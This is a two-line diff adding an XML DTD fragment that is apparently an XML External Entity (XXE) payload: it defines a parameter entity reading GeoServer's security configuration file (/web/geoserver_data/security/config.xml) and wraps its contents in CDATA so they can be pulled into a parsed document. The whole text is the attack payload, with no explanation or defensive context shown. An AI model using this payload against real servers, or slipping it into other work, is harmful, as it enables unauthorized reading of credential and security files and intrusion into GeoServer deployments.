@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///web/geoserver_data/security/config.xml">
+<!ENTITY xxe '<![CDATA[%file;]]>'>
